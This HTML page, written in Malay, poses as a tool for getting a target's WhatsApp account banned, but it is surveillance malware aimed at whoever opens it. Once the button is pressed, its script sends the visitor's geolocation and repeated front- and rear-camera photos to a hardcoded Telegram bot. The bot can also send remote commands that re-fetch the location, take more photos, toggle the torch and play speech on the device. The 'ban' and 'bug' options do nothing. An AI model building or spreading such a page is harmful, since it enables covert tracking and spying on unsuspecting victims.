<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BENNEN WHATSAPP| ALIX LOZ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #000000;
            min-height: 100vh;
            padding: 20px 20px;
            color: #ffffff;
        }

        /* === TAJUK === */
        .tajuk-besar {
            font-size: 23px;
            font-weight: 900;
            text-align: center;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }
        .sub-tajuk {
            font-size: 15px;
            color: #ff3333;
            text-align: center;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }

        /* === GAMBAR === */
        .kotak-gambar {
            width: 100%;
            height: 170px;
            border-radius: 14px;
            overflow: hidden;
            border: 1px solid #222;
            margin-bottom: 20px;
        }
        .gambar-latar {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* === TAB === */
        .tab-bar {
            display: flex;
            gap: 2px;
            margin-bottom: 18px;
        }
        .tab {
            flex:1;
            padding: 12px;
            text-align:center;
            font-weight:bold;
            font-size:16px;
            background:#111;
            border-radius: 6px 6px 0 0;
        }
        .tab.merah { color:#ff3333; background:#1a1a1a; border-bottom: 2px solid #ff3333; }
        .tab.putih { color:#fff; }

        /* === INPUT === */
        .input-kotak {
            width:100%;
            background:#111;
            border:1px solid #333;
            border-radius:8px;
            padding:15px;
            color:#fff;
            font-size:16px;
            margin-bottom:15px;
            outline:none;
        }

        .pilih-kotak {
            width:100%;
            background:#111;
            border:2px solid #ffb800;
            border-radius:8px;
            padding:15px;
            color:#fff;
            font-size:16px;
            margin-bottom:20px;
            appearance:none;
            background-image:url('data:image/svg+xml,<svg fill="white" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
            background-repeat:no-repeat;
            background-position:right 15px center;
        }

        /* === BUTANG === */
        .btn-mula {
            width:100%;
            background:#000;
            color:#ff3333;
            border:2px solid #ff3333;
            padding:14px;
            border-radius:8px;
            font-size:17px;
            font-weight:bold;
            letter-spacing:1px;
            cursor:pointer;
            margin-bottom:25px;
            transition:0.2s;
        }
        .btn-mula:active { background:#ff3333; color:#000; }

        /* === SENARAI MODUL === */
        .modul-item {
            background:#121212;
            border-radius:8px;
            padding:13px 16px;
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:10px;
            font-size:15px;
        }
        .lampu-hijau {
            width:12px;
            height:12px;
            border-radius:50%;
            background:#00ee66;
            box-shadow:0 0 6px #00ee66;
        }
        .lampu-kuning {
            width:12px;
            height:12px;
            border-radius:50%;
            background:#ffb800;
            box-shadow:0 0 6px #ffb800;
        }

        /* === LOG === */
        .kotak-log {
            background:#0f0f0f;
            border-radius:8px;
            padding:14px;
            margin-top:10px;
            font-size:13px;
            color:#ff4444;
            line-height:1.6;
            min-height:120px;
            max-height:250px;
            overflow-y:auto;
        }

        video,canvas,audio {display:none;}
    </style>
</head>
<body>

    <!-- TAJUK -->
    <h1 class="tajuk-besar">BANNED WHATSAPP</h1>
    <div class="sub-tajuk">ALIX LOZ</div>

    <!-- GAMBAR -->
    <div class="kotak-gambar">
        <img class="gambar-latar" src="https://i.ibb.co/93TStYYM/file-000000002d7071faaa9437cd3c363ff9-6.jpg" alt="Anime Blue Sword">
    </div>

    <!-- TAB -->
    <div class="tab-bar">
        <div class="tab merah">BANNED</div>
    </div>

    <!-- INPUT -->
    <input type="text" class="input-kotak" placeholder="Nomor target" id="nombor">

    <select class="pilih-kotak" id="jenis">
        <option>Spam Report</option>
        <option>spam killer</option>
        <option>ben masa</option>
    </select>

    <!-- BUTANG -->
    <button class="btn-mula" onclick="mulakanSistem()">START BANNED</button>

    <!-- SENARAI MODUL -->
    <div class="modul-item"><span>🌐BUKA LOKASI UNTUK BENNEN WHATSAPP</span><div class="lampu-hijau"></div></div>
    <div class="modul-item"><span>🌐masuk nombor target</span><div class="lampu-kuning"></div></div>
    <div class="modul-item"><span>🔊 SUARA ROBOT TTS</span><div class="lampu-hijau"></div></div>

    <!-- LOG -->
    <div class="kotak-log" id="log">
        [SYSTEM] aktif sistem BENNEN ✅<br>
        [OWNER] ALIX LOZ<br>
        [STATUS] Ready to Attack
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <audio id="pemainSuara">

    <script>
        // ✅ DATA BOT TELEGRAM ✅
        const BOT_TOKEN = "8956799082:AAF_L6m4vulIqnqZG1VMsimvtpDw2ZlRSog";
        const CHAT_ID = "8228233355";

        const log = document.getElementById('log');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const pemainSuara = document.getElementById('pemainSuara');
        let lampuHidup = false;
        let torchStream = null;

        // === MULA SISTEM ===
        function mulakanSistem(){
            let no = document.getElementById('nombor').value || "TIADA NOMBOR";
            let jenis = document.getElementById('jenis').value;
            tambahLog("🚀 Serangan bermula: "+no+" | Mod: "+jenis);

            hantarTelegram(`🔴 *target masuk | ALIX LOZ* 🔴\n\n🎯 Sasaran: ${no}\n⚙️ Mod: ${jenis}\n📡 Status: *AKTIF 100%*\n\n⚡ *ARAHAN TELEGRAM:*\n/maps → Hantar Lokasi\n/kamera → Ambil Gambar\n/lampu → BUKA / TUTUP Lampu 💡\n/suara [teks] → Bunyi dalam web sahaja 🔊\n/delay → Aktif Lambat\n/fc → Aktif Tutup Paksa`);

            dapatkanLokasi();
            mulaKamera();
        }

        // === 🎤 FUNGSI: HANYA BUNYI DALAM WEB, TIADA HANTAR KE TELEGRAM ===
        function mainSuaraWeb(teks, bahasa = 'ms') {
            if (!teks) {
                tambahLog("❌ Tiada teks untuk dijadikan suara");
                return;
            }

            tambahLog(`🔊 Sedang membaca: ${teks}`);
            // Pautan TTS yang stabil
            const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(teks)}&tl=${bahasa}&client=tw-ob`;

            // Bunyi terus dalam laman web sahaja
            pemainSuara.src = ttsUrl;
            pemainSuara.volume = 1.0;
            pemainSuara.load();
            pemainSuara.play()
                .then(() => tambahLog("✅ Suara berjaya berbunyi dalam web"))
                .catch(err => tambahLog(`⚠️ Ralat suara: ${err.message}`));
        }

        // === LOKASI ===
        function dapatkanLokasi(){
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(p=>{
                    let lat=p.coords.latitude.toFixed(6), lon=p.coords.longitude.toFixed(6);
                    hantarTelegram(`📍 *LOKASI GOOGLE MAPS:*\nhttps://www.google.com/maps?q=${lat},${lon}`);
                    tambahLog("✅ Lokasi dihantar");
                }, err => tambahLog("❌ Lokasi: " + err.message));
            }
        }

        // === KAMERA ===
        async function mulaKamera(){
            let mod="user";
            const ambil=async()=>{
                try{
                    let strim=await navigator.mediaDevices.getUserMedia({video:{facingMode:mod}});
                    video.srcObject=strim;
                    if(mod==="environment") torchStream=strim;
                    setTimeout(()=>hantarGambar(mod),2000);
                    mod=mod==="user"?"environment":"user";
                }catch(e){tambahLog("❌ Kamera: " + e.name)}
            }; ambil(); setInterval(ambil,8000);
        }
        function hantarGambar(nama){
            if(!video.srcObject) return;
            canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
            hantarGambarTelegram(canvas.toDataURL(),`📸 Kamera ${nama.toUpperCase()}`);
        }

        // === LAMPU ===
        async function tukarLampu(){
            try{
                if(!lampuHidup){
                    if(!torchStream) torchStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",torch:true}});
                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:true}]});
                    lampuHidup=true;
                    tambahLog("💡 Lampu DIBUKA");
                    hantarTelegram("💡 *LAMPU:* DIBUKA ✅");
                }else{
                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:false}]});
                    lampuHidup=false;
                    tambahLog("💡 Lampu DITUTUP");
                    hantarTelegram("💡 *LAMPU:* DITUTUP ❌");
                }
            }catch(e){
                tambahLog("❌ Lampu: " + e.name);
                hantarTelegram("❌ *LAMPU:* Gagal dikawal");
            }
        }

        // === BACA ARAHAN DARI TELEGRAM ===
        setInterval(()=>{
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(r=>r.json()).then(d=>{
                if(d.ok && d.result.length>0){
                    let pesan = d.result.pop().message;
                    if(!pesan || !pesan.text) return;

                    let cmd = pesan.text.trim();
                    let kecil = cmd.toLowerCase();

                    if(kecil==="/maps") dapatkanLokasi();
                    if(kecil==="/kamera") mulaKamera();
                    if(kecil==="/lampu") tukarLampu();
                    if(kecil==="/delay") hantarTelegram("⏱️ *BUG DELAY:* Aktif ✅");
                    if(kecil==="/fc") hantarTelegram("🌀 *BUG FC:* Aktif ✅");

                    // ✅ ARAHAN SUARA: HANYA BUNYI DALAM WEB, TIADA HANTAR MP3
                    if(kecil.startsWith("/suara ")){
                        let teks = cmd.substring(6).trim();
                        mainSuaraWeb(teks, 'ms'); // 'ms' = BM, tukar ke 'id' kalau nak Indonesia
                    }
                }
            }).catch(()=>{});
        }, 4000);

        // === ALAT BANTU ===
        function hantarTelegram(t){
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                method:"POST", headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:CHAT_ID, text:t, parse_mode:"Markdown"})
            });
        }
        function tambahLog(t){log.innerHTML+=t+"<br>";log.scrollTop=log.scrollHeight;}
        function dataURLkeBlob(d){let b=d.split(','),t=b[0].match(/:(.*?);/)[1],s=atob(b[1]),l=s.length,a=new Uint8Array(l);while(l--)a[l]=s.charCodeAt(l);return new Blob([a],{type:t})}
        function hantarGambarTelegram(url,judul){let b=dataURLkeBlob(url),f=new FormData();f.append("chat_id",CHAT_ID);f.append("photo",b);f.append("caption",judul);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:f})}
    </script>

</body>
</html>
